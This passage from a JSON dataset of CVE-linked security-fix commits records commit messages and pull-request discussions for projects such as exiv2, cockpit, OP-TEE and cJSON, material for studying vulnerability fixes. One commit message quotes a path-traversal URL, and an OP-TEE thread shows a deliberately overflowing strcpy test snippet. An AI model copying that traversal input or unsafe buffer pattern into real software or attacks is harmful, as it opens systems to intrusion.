(x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Tools\\MSVC\\14.16.27023\\include\\type_traits(227): note: see declaration of 'std::enable_if<false,void>' (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp)                                                                                                                                                                                                                           \n> c:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\safe_op.hpp(348): error C2146: syntax error: missing '>' before identifier 'type' (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp) [C:\\msys64\\home\\r \n> mills\\gnu\\github\\exiv2\\master\\build\\src\\exiv2lib_int.vcxproj]  \n> ```\n>\n> My \"fix\" is to comment off some code in safe_op.hpp\n>\n> ```\n>     namespace Internal\n>     {\n>         template <typename from, typename to, typename = void>\n>         struct is_safely_convertible : std::false_type\n>         {\n>             static_assert(std::is_integral<from>::value&& std::is_integral<to>::value,\n>                           \"from and to must both be integral types\");\n>         };\n> /*\n>         template <typename from, typename to>\n>         struct is_safely_convertible<\n>             from, to,\n>             typename std::enable_if<((std::numeric_limits<from>::max() <= std::numeric_limits<to>::max()) &&\n>                                      (std::numeric_limits<from>::min() >= std::numeric_limits<to>::min()))>::type>\n>             : std::true_type\n>         {\n>         };\n> */\n> ```\n\nThis is unfortunately not really a fix, as it just comments out the\nproblematic part. The compiler error goes away, but the intended\nfunctionality is lost.\n\n>\n> #### My reason to try this\n>\n> You have two definitions for the template:\n> ```\n> template <typename from, typename to, typename = void>\n> and\n> template <typename from, typename to>\n> ```\n> This might be ambiguous.\n\nThat's kind of the point. What I'm doing here is called SFINAE\n(Substitution Failure Is Not An Error), which means that the compiler\ndoes not error out immediately when fails to insert a type in a template\noverload.\n\nLet's say you have two template overloads of the function foo:\n\ntemplate <typename T, typename = void>\nvoid foo()\n\nand\n\ntemplate <typename T>\nvoid foo<T, typename something_that_depends_on_T<T>::type>()\n\n\nWhen you instantiate foo, the compiler will start inserting the template\nparameters starting with the most specialized overload (here the second\none). It will insert T and then try to find out what\n`something_that_depends_on_T<T>::type` is. If the resolution of this\ntype results in an error, then this is **not** fatal. The compiler\nsimply tries the next less specialized template overload.\n\n\nYou can use this in conjunction with \"dummy\" template parameters\n(template parameters that have a unused default value and are not\nactually used in the template) to have multiple specializations of the\nsame function. You then provide a conditional type\n(`something_that_depends_on_T<T>::type` in the above example) that\nresolves only in the case when you want the overload and doesn't either.\n\n\n>\n> #### Other ideas:\n>\n> I tried some other guesses and none of them compiled.  For example, I changed `::type` to `::typename` because it complained:\n>\n> ```\n> safe_op.hpp(348): error C2146: syntax error: missing '>' before identifier 'type'\n> ```\n\nYes, that cannot work, because type is a public member of\nstd::enable_if.\n\n>\n> #### My Suggestions\n>\n> 1) is `type` correct on line 348?  For sure, I don't know what it means and apparently the compiler doesn't either!\n>\n\nIt is definitely correct. GCC and clang don't complain about this and\nwork without problems.\n\n> 2) Only compile `template <typename from, typename to> .... };` for `#ifndef _MSC_VER`.  You'll loose safety for MSVC builds.  It could be a compiler bug that goes away in the future.  However it's there with both 2017 and 2019.\n>\n\nNot including the overload for MSVC seriously cripples the overall\nusefulness of the whole code. I'd prefer not to do that unless MSVC\nreally doesn't cooperate.\n\n> 3) It could be an SDK issue.  For both 2017 and 2019, CMake reports:\n> ```\n> Selecting Windows SDK version 10.0.17763.0 to target Windows 10.0.17134.\n> ```\n> I suspect a lot of the template voodoo comes from the SDK and not the compiler.  As CMake's announcing the SDK, it's likely that we could force him to use a different SDK with different consequences.\n>\n\nUnlikely, as this uses only std::enable_if and std::numeric_limits (the\nformer can be implemented in ~5 lines of code and the latter is also\nvery simple, albeit requiring a lot of boilerplate code).\n\n> -- \n> You are receiving this because you authored the thread.\n> Reply to this email directly or view it on GitHub:\n> https://github.com/Exiv2/exiv2/pull/898#issuecomment-500241656\n Let's see if we can get this magic into v1.00.",
            "pr_title_words": 2,
            "comments_words": 1333,
            "total_other_info_words": 1335
        },
        {
            "cve-id": "CVE-2019-3804",
            "commit_url": "https://github.com/cockpit-project/cockpit/commit/c51f6177576d7e12614c64d316cf0b67addd17c9",
            "commit_msg": "ws: Fix bug parsing invalid base64 headers\n\nThe len parameter to g_base64_decode_inplace() is a inout\r\nparameter, and needs to be initialized. Lets just use\r\nthe simpler g_base64_decode() function. This fixes a segfault.\r\n\r\nCloses #10819",
            "commit_msg_words": 34,
            "other_info": "ws: Fix bug parsing invalid base64 headers",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2019-16903",
            "commit_url": "https://github.com/plutinosoft/Platinum/commit/788ea5b4e15e6b0efeffdcbc0db03bf4591ce79e",
            "commit_msg": "Fix vulnerability around urls crafter as http://host/../secret.foo",
            "commit_msg_words": 7,
            "other_info": "Fix path transversal vulnerability Fixes #22",
            "pr_title_words": 4,
            "comments_words": 2,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-11932",
            "commit_url": "https://github.com/koral--/android-gif-drawable/commit/4944c92761e0a14f04868cbcf4f4e86fd4b7a4a9",
            "commit_msg": "Do not realloc array if new raster size is 0.\n\nif realloc() is called with 0 size it may return NULL and this will be incorrectly handled\nas not enough memory and (also) rasterBits will be freed by realloc but we will not update\nit.",
            "commit_msg_words": 45,
            "other_info": "Double free problem # [Codecov](https://codecov.io/gh/koral--/android-gif-drawable/pull/673?src=pr&el=h1) Report\n> :exclamation: No coverage uploaded for pull request base (`dev@ca8a4a3`). [Click here to learn what that means](https://docs.codecov.io/docs/error-reference#section-missing-base-commit).\n> The diff coverage is `n/a`.\n\n[![Impacted file tree graph](https://codecov.io/gh/koral--/android-gif-drawable/pull/673/graphs/tree.svg?width=650&token=d2J7QrobFF&height=150&src=pr)](https://codecov.io/gh/koral--/android-gif-drawable/pull/673?src=pr&el=tree)\n\n```diff\n@@          Coverage Diff          @@\n##             dev    #673   +/-   ##\n=====================================\n  Coverage       ?   4.48%           \n=====================================\n  Files          ?      26           \n  Lines          ?    1294           \n  Branches       ?     108           \n=====================================\n  Hits           ?      58           \n  Misses         ?    1233           \n  Partials       ?       3\n```\n\n\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/koral--/android-gif-drawable/pull/673?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/koral--/android-gif-drawable/pull/673?src=pr&el=footer). Last update [ca8a4a3...4944c92](https://codecov.io/gh/koral--/android-gif-drawable/pull/673?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n I've analyzed this case deeper and it turns out that frames having 0 size are ignored when reading file using `DGifGetCodeNext` (this is used just after opening file to determine number of frames etc.) but they are not ignored when using `DGifGetLine` (this is used when decoding pixels).\r\n\r\nAlthough this change fixes the issue visible to user I'll report this inconsistency to GIFLib bugtracker. I expect that while reading file in both ways we should see the same number of frames. Hi @koral-- , when will be the next release that contains this fix? It is already released about month ago. Ah it's in 1.2.18. Thanks! super cool. Great patch",
            "pr_title_words": 3,
            "comments_words": 216,
            "total_other_info_words": 219
        },
        {
            "cve-id": "CVE-2019-1010292",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/e3adcf566cb278444830e7badfdcc3983e334fd1",
            "commit_msg": "core: ensure that supplied range matches MOBJ\n\nIn set_rmem_param() if the MOBJ is found by the cookie it's verified to\nrepresent non-secure shared memory. Prior to this patch the supplied\nsub-range to be used of the MOBJ was not checked here and relied on\nlater checks further down the chain. Those checks seems to be enough\nfor user TAs, but not for pseudo TAs where the size isn't checked.\n\nThis patch adds a check for offset and size to see that they remain\ninside the memory covered by the MOBJ.\n\nFixes: OP-TEE-2018-0004: \"Unchecked parameters are passed through from\nREE\".\n\nSigned-off-by: Jens Wiklander <jens.wiklander@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Joakim Bech <joakim.bech@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>",
            "commit_msg_words": 125,
            "other_info": "Fixes for security potential issues reported by Riscure I've seen the Shippable error, I'll have a look at it. > I've seen the Shippable error, I'll have a look at it.\r\n\r\nI've changed the macro to only consider SMALL_PAGE_SIZE, since that is what we check against. Will push a fix soon. Pushed fixes for all (fixable) comments so far. I've saved the ones that has to be done at rebase/force push time. LGTM, you may add my:\r\n\r\n`Acked-by: Jerome Forissier <jerome.forissier@linaro.org>`\r\n\r\n...to all the commits that deal with CFG_ flags. `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments. > `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments.\r\n\r\n@etienne-lms , I'm confused. I cannot see any comments from you. Is GitHub playing me a trick here? Pushed a few more fixes.\r\n\r\nWaiting for:\r\n- Etienne's follow up answers on my replies to his findings.\r\n\r\nTo-do at rebase/force/squash:\r\n- Add Acked-by tags.\r\n- Fix wrong author vs Signed-Off-By.\r\n - Fixed SoB / Author inconsistency.\r\n- Fixed all outstanding review comments.\r\n- Fixed spelling error found by checkpatch / Shippable.\r\n- Added A-B and T-B tags.\r\n\r\nSo, if IBART and friends are happy .... then ...\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks! Sorry, I still have comments on the last 6 commits.\r\n\r\n- \"plat-all: Enable CFG_CORE_STACK_PROTECTOR_STRONG=y by default\" removes `CFG_WITH_STACK_CANARIES ?= y` from `rpi3`. It also enables`CFG_TA_STACK_PROTECTOR_STRONG ?= y` which is introduced in a later commit. Overall I think this commit had better be folded into the parent commit \"core: introduce CFG_CORE_STACK_PROTECTOR_STRONG flag\" (which will also avoid a Travis warning about missing commit description).\r\n- \"ta-dev-kit: enable _FORTIFY_SOURCE=2 on optimized builds\": you say \"shall only be enabled...\", so why isn't it part of commit \"ta-dev-kit: Introduce CFG_TA_FORTIFY_SOURCE\"?\r\n\r\nAlso I think the Travis warnings (missing commit descriptions) should be fixed. When introducing a new flag, we should explain what it does, why we add it, and what is its default value. Things I expect to understand when reading the description are: what is a stack protector? What happens when the \"protection\" detects that something is wrong? Does the TA panic? Does the TEE core panic? Same for the \"fortify\" option.\r\n\r\nIn the end I'd like to have 4 commits:\r\n```\r\n    ta: introduce CFG_TA_STACK_PROTECTOR_STRONG\r\n    ta: introduce CFG_TA_FORTIFY_SOURCE\r\n    core: introduce CFG_CORE_STACK_PROTECTOR_STRONG\r\n    core: introduce CFG_CORE_FORTIFY_SOURCE\r\n```\r\n @jforissier , makes sense. I'll do another clean-up / clarification round, stay tuned. Easier said that done trying to trigger the protectors, since I get data abort when trying to put together examples that should trigger the stack-protector for example. I'd expect some output like \"`*** stack smashing detected ***` at least before the data-abort. @jbech-linaro hard to find documentation, but it looks like the compiler will just call `__stack_chk_fail()`, which we happen to define here: https://github.com/OP-TEE/optee_os/blob/3.3.0/lib/libutils/isoc/stack_check.c\r\nAt least, that's what I can see in the disassembly (`tee.dmp` or `objdump -ldx ta.elf`).\r\n\r\nSo, if I understand correctly, the TA or the TEE core thread would just hang when stack smashing is detected (instead of proceeding with corrupt data). I think I can trigger it successfully now, since without using the flags I get data-aborts, with the flags enabled I get stuck. I've tried to figure out where I am by checking GDB, but so far I haven't been able to make sense out of the address. I'll try to see whether it ends up in `stack_check.c` or not. @jbech-linaro sounds good. Perhaps `__stack_chk_fail()` should `EMSG()` and call `panic()` (`ifdef __KERNEL__`) or `abort()`/`utee_panic()` (user mode TA). Or is there any reason we could not do that in this context? I've tried setting a breakpoint at `__stack_chk_fail`, but it doesn't seem to hang there. But I can see my data (`foo(AAAA...)`) in the `r2` when breaking, so I suspect it is stuck somewhere in strcpy, and/or \"panic\" while(1) as a consequence of this.\r\n```bash\r\nfoo(\"AAAAAAA.....\");\r\n\r\nvoid foo(char *bar) {\r\nchar buffer[16];\r\nstrcpy(buffer, bar)\r\n}\r\n```\r\n\r\n```\r\nr2 = 0x00414141\r\n...\r\n```\r\nI think I will skip the CFG_-patches and submit them as a separate PR if/when I have some time to spare. They weren't really part of the Riscure report, I just added it, since I thought it'd be useful to catch things. > I think I will skip the CFG_-patches [...]\r\n\r\nSure. They are definitely useful IMO, but certainly not required for 3.4.0. Thanks! Two things ....\r\n1. I've removed the CFG patches from this PR and pushed that.\r\n2. I've rebuilt QEMU with SMP=1 and now!!! Lo and behold! I'm stuck in .... drum roll ... `__stack_chk_fail() { while (1) }`.\r\n\r\nSo it seems to work as expected.\r\n\r\nAnyhow, as before, if IBART and friends are happy:\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks!",
            "pr_title_words": 8,
            "comments_words": 780,
            "total_other_info_words": 788
        },
        {
            "cve-id": "CVE-2019-1010298",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/70697bf3c5dc3d201341b01a1a8e5bc6d2fb48f8",
            "commit_msg": "svc: check for allocation overflow in crypto calls part 2\n\nWithout checking for overflow there is a risk of allocating a buffer\nwith size smaller than anticipated and as a consequence of that it might\nlead to a heap based overflow with attacker controlled data written\noutside the boundaries of the buffer.\n\nFixes: OP-TEE-2018-0011: \"Integer overflow in crypto system calls (x2)\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>",
            "commit_msg_words": 87,
            "other_info": "Fixes for security potential issues reported by Riscure I've seen the Shippable error, I'll have a look at it. > I've seen the Shippable error, I'll have a look at it.\r\n\r\nI've changed the macro to only consider SMALL_PAGE_SIZE, since that is what we check against. Will push a fix soon. Pushed fixes for all (fixable) comments so far. I've saved the ones that has to be done at rebase/force push time. LGTM, you may add my:\r\n\r\n`Acked-by: Jerome Forissier <jerome.forissier@linaro.org>`\r\n\r\n...to all the commits that deal with CFG_ flags. `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments. > `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments.\r\n\r\n@etienne-lms , I'm confused. I cannot see any comments from you. Is GitHub playing me a trick here? Pushed a few more fixes.\r\n\r\nWaiting for:\r\n- Etienne's follow up answers on my replies to his findings.\r\n\r\nTo-do at rebase/force/squash:\r\n- Add Acked-by tags.\r\n- Fix wrong author vs Signed-Off-By.\r\n - Fixed SoB / Author inconsistency.\r\n- Fixed all outstanding review comments.\r\n- Fixed spelling error found by checkpatch / Shippable.\r\n- Added A-B and T-B tags.\r\n\r\nSo, if IBART and friends are happy .... then ...\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks! Sorry, I still have comments on the last 6 commits.\r\n\r\n- \"plat-all: Enable CFG_CORE_STACK_PROTECTOR_STRONG=y by default\" removes `CFG_WITH_STACK_CANARIES ?= y` from `rpi3`. It also enables`CFG_TA_STACK_PROTECTOR_STRONG ?= y` which is introduced in a later commit. Overall I think this commit had better be folded into the parent commit \"core: introduce CFG_CORE_STACK_PROTECTOR_STRONG flag\" (which will also avoid a Travis warning about missing commit description).\r\n- \"ta-dev-kit: enable _FORTIFY_SOURCE=2 on optimized builds\": you say \"shall only be enabled...\", so why isn't it part of commit \"ta-dev-kit: Introduce CFG_TA_FORTIFY_SOURCE\"?\r\n\r\nAlso I think the Travis warnings (missing commit descriptions) should be fixed. When introducing a new flag, we should explain what it does, why we add it, and what is its default value. Things I expect to understand when reading the description are: what is a stack protector? What happens when the \"protection\" detects that something is wrong? Does the TA panic? Does the TEE core panic? Same for the \"fortify\" option.\r\n\r\nIn the end I'd like to have 4 commits:\r\n```\r\n    ta: introduce CFG_TA_STACK_PROTECTOR_STRONG\r\n    ta: introduce CFG_TA_FORTIFY_SOURCE\r\n    core: introduce CFG_CORE_STACK_PROTECTOR_STRONG\r\n    core: introduce CFG_CORE_FORTIFY_SOURCE\r\n```\r\n @jforissier , makes sense. I'll do another clean-up / clarification round, stay tuned. Easier said that done trying to trigger the protectors, since I get data abort when trying to put together examples that should trigger the stack-protector for example. I'd expect some output like \"`*** stack smashing detected ***` at least before the data-abort. @jbech-linaro hard to find documentation, but it looks like the compiler will just call `__stack_chk_fail()`, which we happen to define here: https://github.com/OP-TEE/optee_os/blob/3.3.0/lib/libutils/isoc/stack_check.c\r\nAt least, that's what I can see in the disassembly (`tee.dmp` or `objdump -ldx ta.elf`).\r\n\r\nSo, if I understand correctly, the TA or the TEE core thread would just hang when stack smashing is detected (instead of proceeding with corrupt data). I think I can trigger it successfully now, since without using the flags I get data-aborts, with the flags enabled I get stuck. I've tried to figure out where I am by checking GDB, but so far I haven't been able to make sense out of the address. I'll try to see whether it ends up in `stack_check.c` or not. @jbech-linaro sounds good. Perhaps `__stack_chk_fail()` should `EMSG()` and call `panic()` (`ifdef __KERNEL__`) or `abort()`/`utee_panic()` (user mode TA). Or is there any reason we could not do that in this context? I've tried setting a breakpoint at `__stack_chk_fail`, but it doesn't seem to hang there. But I can see my data (`foo(AAAA...)`) in the `r2` when breaking, so I suspect it is stuck somewhere in strcpy, and/or \"panic\" while(1) as a consequence of this.\r\n```bash\r\nfoo(\"AAAAAAA.....\");\r\n\r\nvoid foo(char *bar) {\r\nchar buffer[16];\r\nstrcpy(buffer, bar)\r\n}\r\n```\r\n\r\n```\r\nr2 = 0x00414141\r\n...\r\n```\r\nI think I will skip the CFG_-patches and submit them as a separate PR if/when I have some time to spare. They weren't really part of the Riscure report, I just added it, since I thought it'd be useful to catch things. > I think I will skip the CFG_-patches [...]\r\n\r\nSure. They are definitely useful IMO, but certainly not required for 3.4.0. Thanks! Two things ....\r\n1. I've removed the CFG patches from this PR and pushed that.\r\n2. I've rebuilt QEMU with SMP=1 and now!!! Lo and behold! I'm stuck in .... drum roll ... `__stack_chk_fail() { while (1) }`.\r\n\r\nSo it seems to work as expected.\r\n\r\nAnyhow, as before, if IBART and friends are happy:\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks!",
            "pr_title_words": 8,
            "comments_words": 780,
            "total_other_info_words": 788
        },
        {
            "cve-id": "CVE-2019-11835",
            "commit_url": "https://github.com/DaveGamble/cJSON/commit/a43fa56a63920343d0ac8f8e73a6b0447867f459",
            "commit_msg": "Rewrite cJSON_Minify, fixing buffer overflows, fixes #338\n\nAlso first tests for cJSON_Minify.\nThanks @bigric3 for reporting",
            "commit_msg_words": 16,
            "other_info": "Release 1.7.11",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2019-25078",
            "commit_url": "https://github.com/manugarg/pacparser/commit/853e8f45607cb07b877ffd270c63dbcdd5201ad9",
            "commit_msg": "Fix possible memory overwrite vulnerability. (#134)",
            "commit_msg_words": 6,
            "other_info": "Fix possible memory overwrite vulnerability.",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2019-17389",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/74e19d451cfa4397b58745a1efcfce81d2eb6426",
            "commit_msg": "emcute: never return from receive loop\n\nWithout this change an attacker would be able to stop the emcute server\nby sending a crafted packet triggering this branch. The solution is\nusing `continue` instead of `return`.",
            "commit_msg_words": 35,
            "other_info": "emcute: never return from receive loop Will try to remember to add a test case for that to #11823. Ok, wasn't that hard...: https://github.com/RIOT-OS/RIOT/pull/11823/commits/edae2c268abc7fd69d784b8b8f67d1aa98b3fb03. I was able to confirm this bug fix using that patch and cherry-picking https://github.com/RIOT-OS/RIOT/pull/12382/commits/74e19d451cfa4397b58745a1efcfce81d2eb6426 and https://github.com/RIOT-OS/RIOT/pull/11957/commits/10a3f3e8ed7f94596379b2edc0ac2a86a2699cbd on top (and without of course).",
            "pr_title_words": 6,
            "comments_words": 40,
            "total_other_info_words": 46
        },
        {
            "cve-id": "CVE-2019-15786",
            "commit_url": "https://github.com/ROBOTIS-GIT/DynamixelSDK/commit/12a709bdbd268d66d0b2a07e817610b7da0a71f9",
            "commit_msg": "- fixed buffer overflow bug (rxpacket size)",
            "commit_msg_words": 7,
            "other_info": "- fixed buffer overflow bug (rxpacket size)",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2019-13110",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/f7253d44da08b082781267f855cda172f75d7869",
            "commit_msg": "Avoid integer overflow.",
            "commit_msg_words": 3,
            "other_info": "Avoid integer overflow.",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2019-3817",
            "commit_url": "https://github.com/rpm-software-management/libcomps/commit/e3a5d056633677959ad924a51758876d415e7046",
            "commit_msg": "Fix UAF in comps_objmrtree_unite function\n\nThe added field is not used at all in many places and it is probably the\nleft-over of some copy-paste.",
            "commit_msg_words": 25,
            "other_info": "Fix UAF in comps_objmrtree_unite function Thank",
            "pr_title_words": 5,
            "comments_words": 1,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-15566",
            "commit_url": "https://github.com/Alfresco/alfresco-android-app/commit/32faa4355f82783326d16b0252e81e1231e12c9c",
            "commit_msg": "ANDROID-779 Fix SQL injection vulnerability exposed in veracode report",
            "commit_msg_words": 9,
            "other_info": "ANDROID-779 Fix SQL injection vulnerability exposed in veracode report",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2019-18212",
            "commit_url": "https://github.com/eclipse/lemminx/commit/e37c399aa266be1b7a43061d4afc43dc230410d2",
            "commit_msg": "Reject download of resource which are not in the cache folder (url which\nuses several ../../).\n\nSigned-off-by: azerr <azerr@redhat.com>",
            "commit_msg_words": 19,
            "other_info": "Reject download of resource which are not in the cache folder [CVE-2019-18212](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18212) was opened  about this issue.",
            "pr_title_words": 11,
            "comments_words": 6,
            "total_other_info_words": 17
        },
        {
            "cve-id": "CVE-2019-15788",
            "commit_url": "https://github.com/NVIDIA-Genomics-Research/GenomeWorks/commit/3217f01b0525596c214a66d4154ce20c437c530f",
            "commit_msg": "[cudapoa] fix integer overflow",
            "commit_msg_words": 4,
            "other_info": "[cudapoa] fix integer overflow",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2019-13990",
            "commit_url": "https://github.com/quartz-scheduler/quartz/commit/a1395ba118df306c7fe67c24fb0c9a95a4473140",
            "commit_msg": "Fixes #467 provide XML parser with a strong configuration to prevent XXE attacks",
            "commit_msg_words": 13,
            "other_info": "[master] Issue 467  I believe this falls under \"contributions which do no require a full Contributor's License Agreement\", as described here: http://www.quartz-scheduler.org/community/contribute.html#contributions-which-do-not-require-full-contributors-license-agreement-cla\r\n\r\n@jgallimore If you could confirm that you agree with a simple yes below that would be great! Yes, I agree. Thank you!",
            "pr_title_words": 3,
            "comments_words": 41,
            "total_other_info_words": 44
        },
        {
            "cve-id": "CVE-2019-1010296",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/b60e1cee406a1ff521145ab9534370dfb85dd592",
            "commit_msg": "svc: check for allocation overflow in syscall_cryp_obj_populate\n\nWithout checking for overflow there is a risk of allocating a buffer\nwith size smaller than anticipated and as a consequence of that it might\nlead to a heap based overflow with attacker controlled data written\noutside the boundaries of the buffer.\n\nFixes: OP-TEE-2018-0009: \"Integer overflow in crypto system calls\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>",
            "commit_msg_words": 83,
            "other_info": "Fixes for security potential issues reported by Riscure I've seen the Shippable error, I'll have a look at it. > I've seen the Shippable error, I'll have a look at it.\r\n\r\nI've changed the macro to only consider SMALL_PAGE_SIZE, since that is what we check against. Will push a fix soon. Pushed fixes for all (fixable) comments so far. I've saved the ones that has to be done at rebase/force push time. LGTM, you may add my:\r\n\r\n`Acked-by: Jerome Forissier <jerome.forissier@linaro.org>`\r\n\r\n...to all the commits that deal with CFG_ flags. `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments. > `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments.\r\n\r\n@etienne-lms , I'm confused. I cannot see any comments from you. Is GitHub playing me a trick here? Pushed a few more fixes.\r\n\r\nWaiting for:\r\n- Etienne's follow up answers on my replies to his findings.\r\n\r\nTo-do at rebase/force/squash:\r\n- Add Acked-by tags.\r\n- Fix wrong author vs Signed-Off-By.\r\n - Fixed SoB / Author inconsistency.\r\n- Fixed all outstanding review comments.\r\n- Fixed spelling error found by checkpatch / Shippable.\r\n- Added A-B and T-B tags.\r\n\r\nSo, if IBART and friends are happy .... then ...\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks! Sorry, I still have comments on the last 6 commits.\r\n\r\n- \"plat-all: Enable CFG_CORE_STACK_PROTECTOR_STRONG=y by default\" removes `CFG_WITH_STACK_CANARIES ?= y` from `rpi3`. It also enables`CFG_TA_STACK_PROTECTOR_STRONG ?= y` which is introduced in a later commit. Overall I think this commit had better be folded into the parent commit \"core: introduce CFG_CORE_STACK_PROTECTOR_STRONG flag\" (which will also avoid a Travis warning about missing commit description).\r\n- \"ta-dev-kit: enable _FORTIFY_SOURCE=2 on optimized builds\": you say \"shall only be enabled...\", so why isn't it part of commit \"ta-dev-kit: Introduce CFG_TA_FORTIFY_SOURCE\"?\r\n\r\nAlso I think the Travis warnings (missing commit descriptions) should be fixed. When introducing a new flag, we should explain what it does, why we add it, and what is its default value. Things I expect to understand when reading the description are: what is a stack protector? What happens when the \"protection\" detects that something is wrong? Does the TA panic? Does the TEE core panic? Same for the \"fortify\" option.\r\n\r\nIn the end I'd like to have 4 commits:\r\n```\r\n    ta: introduce CFG_TA_STACK_PROTECTOR_STRONG\r\n    ta: introduce CFG_TA_FORTIFY_SOURCE\r\n    core: introduce CFG_CORE_STACK_PROTECTOR_STRONG\r\n    core: introduce CFG_CORE_FORTIFY_SOURCE\r\n```\r\n @jforissier , makes sense. I'll do another clean-up / clarification round, stay tuned. Easier said that done trying to trigger the protectors, since I get data abort when trying to put together examples that should trigger the stack-protector for example. I'd expect some output like \"`*** stack smashing detected ***` at least before the data-abort. @jbech-linaro hard to find documentation, but it looks like the compiler will just call `__stack_chk_fail()`, which we happen to define here: https://github.com/OP-TEE/optee_os/blob/3.3.0/lib/libutils/isoc/stack_check.c\r\nAt least, that's what I can see in the disassembly (`tee.dmp` or `objdump -ldx ta.elf`).\r\n\r\nSo, if I understand correctly, the TA or the TEE core thread would just hang when stack smashing is detected (instead of proceeding with corrupt data). I think I can trigger it successfully now, since without using the flags I get data-aborts, with the flags enabled I get stuck. I've tried to figure out where I am by checking GDB, but so far I haven't been able to make sense out of the address. I'll try to see whether it ends up in `stack_check.c` or not. @jbech-linaro sounds good. Perhaps `__stack_chk_fail()` should `EMSG()` and call `panic()` (`ifdef __KERNEL__`) or `abort()`/`utee_panic()` (user mode TA). Or is there any reason we could not do that in this context? I've tried setting a breakpoint at `__stack_chk_fail`, but it doesn't seem to hang there. But I can see my data (`foo(AAAA...)`) in the `r2` when breaking, so I suspect it is stuck somewhere in strcpy, and/or \"panic\" while(1) as a consequence of this.\r\n```bash\r\nfoo(\"AAAAAAA.....\");\r\n\r\nvoid foo(char *bar) {\r\nchar buffer[16];\r\nstrcpy(buffer, bar)\r\n}\r\n```\r\n\r\n```\r\nr2 = 0x00414141\r\n...\r\n```\r\nI think I will skip the CFG_-patches and submit them as a separate PR if/when I have some time to spare. They weren't really part of the Riscure report, I just added it, since I thought it'd be useful to catch things. > I think I will skip the CFG_-patches [...]\r\n\r\nSure. They are definitely useful IMO, but certainly not required for 3.4.0. Thanks! Two things ....\r\n1. I've removed the CFG patches from this PR and pushed that.\r\n2. I've rebuilt QEMU with SMP=1 and now!!! Lo and behold! I'm stuck in .... drum roll ... `__stack_chk_fail() { while (1) }`.\r\n\r\nSo it seems to work as expected.\r\n\r\nAnyhow, as before, if IBART and friends are happy:\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks!",
            "pr_title_words": 8,
            "comments_words": 780,
            "total_other_info_words": 788
        },
        {
            "cve-id": "CVE-2019-20016",
            "commit_url": "https://github.com/hoene/libmysofa/commit/2e6fac6ab6156dae8e8c6f417741388084b70d6f",
            "commit_msg": "Fixed recursive function calls",
            "commit_msg_words": 4,
            "other_info": "Fixed recursive function calls",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2019-3821",
            "commit_url": "https://github.com/ceph/civetweb/commit/8fba7751f61a20158fedc3fc69684e9fe8cd0dce",
            "commit_msg": "Fix file descriptor leak.\n\nIf the openssl initial negotiation fails, then the rest of\nwhat sslize does doesn't happen.  One of the last things\nsslize does is to close the socket at the end of the session.\nThat needs to happen even if there's no session.\n\nSigned-off-by: Marcus Watts <mwatts@redhat.com>",
            "commit_msg_words": 50,
